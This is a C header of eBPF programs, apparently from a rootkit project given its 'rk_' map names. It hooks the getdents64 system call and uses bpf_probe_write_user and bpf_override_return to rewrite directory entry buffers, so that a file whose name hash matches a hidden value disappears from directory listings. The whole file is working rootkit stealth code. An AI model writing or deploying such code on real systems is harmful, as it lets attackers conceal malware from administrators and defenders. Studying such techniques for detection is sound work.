#ifndef __OVERRIDE_DIR_USER_H
#define __OVERRIDE_DIR_USER_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

void __attribute__((always_inline)) copy(void *dst, void *src, int len)
{
#pragma unroll
    for (int i = 0; i != 10; i++)
    {
        if (len - 20 > 0)
        {
            bpf_probe_write_user(dst, src, 20);
            dst += 20;
            src += 20;

            len -= 20;
        }
    }

    if (len == 0)
        return;

#pragma unroll
    for (int i = 0; i != 20; i++)
    {
        if (len > 0)
        {

            bpf_probe_write_user(dst, src, 1);
            dst++;
            src++;

            len--;
        }
    }
}

SEC("kprobe/override_getdents")
int override_getdents(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
    if (!getdents)
    {
        return 0;
    }

    int size = (unsigned int)PT_REGS_RC(ctx);

    char buff[256] = {};
    u64 hash;

    unsigned short reclen = 0;

#pragma unroll
    for (int i = 0; i != 100; i++)
    {
        if (!getdents->src)
        {
            bpf_probe_read_str(buff, sizeof(buff), (void *)getdents->dirent->d_name);

            hash = FNV_BASIS;
            update_hash_str(&hash, buff);

            bpf_probe_read(&reclen, sizeof(reclen), (void *)&getdents->dirent->d_reclen);

            if (hash == getdents->hidden_hash)
            {
                getdents->reclen = reclen;
                getdents->src = (void *)getdents->dirent + reclen;
            }
        }
        getdents->read += reclen;

        if (getdents->read < size && getdents->src && getdents->dirent != getdents->src)
        {
            struct linux_dirent64 src;
            bpf_probe_read(&src, sizeof(src), getdents->src);
            src.d_off -= reclen;

            bpf_probe_write_user((void *)getdents->dirent, &src, sizeof(src));

            int remains = src.d_reclen - sizeof(struct linux_dirent64);
            if (remains > 0)
            {
                bpf_probe_read(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
                // currenlty doesn't support file longer than 220
                copy((void *)getdents->dirent + sizeof(struct linux_dirent64), buff, remains);
            }

            getdents->src = (void *)getdents->src + src.d_reclen;
            reclen = src.d_reclen;
        }

        getdents->dirent = (void *)getdents->dirent + reclen;
    }

    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS_PROG);

    return 0;
}

SEC("kretprobe/__x64_sys_getdents64")
int __x64_sys_getdents64_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
    if (!getdents)
        return 0;

    if (getdents->reclen)
    {
        int size = (int)PT_REGS_RC(ctx);
        bpf_override_return(ctx, size - getdents->reclen);
    }

    return 0;
}

#endif